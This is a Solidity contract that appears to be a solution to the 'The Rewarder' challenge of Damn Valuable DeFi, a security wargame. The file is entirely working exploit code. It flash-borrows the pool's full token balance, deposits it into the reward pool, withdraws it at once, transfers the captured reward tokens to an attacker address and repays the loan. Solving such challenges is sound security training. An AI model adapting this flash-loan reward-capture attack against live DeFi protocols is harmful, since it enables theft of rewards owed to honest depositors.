// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../DamnValuableToken.sol";
import "hardhat/console.sol";
import "../the-rewarder/RewardToken.sol";

contract TheRewarderAttacker{

    FlashLoanerPool public immutable flashLoaner;
    TheRewarderPool public immutable rewarderPool;
    DamnValuableToken public immutable dvToken;
    RewardToken public immutable rewardToken;
    address public attacker;

    constructor(address _flashLoaner, address _rewarderPool, address _dvToken, address _rewardToken, address _attacker){
        flashLoaner = FlashLoanerPool(_flashLoaner);
        rewarderPool = TheRewarderPool(_rewarderPool);
        dvToken = DamnValuableToken(_dvToken);
        rewardToken = RewardToken(_rewardToken);
        attacker = _attacker;
    }

    function attack() external{
        flashLoaner.flashLoan(dvToken.balanceOf(address(flashLoaner)));
    }

    function receiveFlashLoan(uint256 amount) external{
        dvToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        rewardToken.transfer(attacker, rewardToken.balanceOf(address(this)));
        // pay back
        dvToken.transfer(address(flashLoaner), amount);
    }
}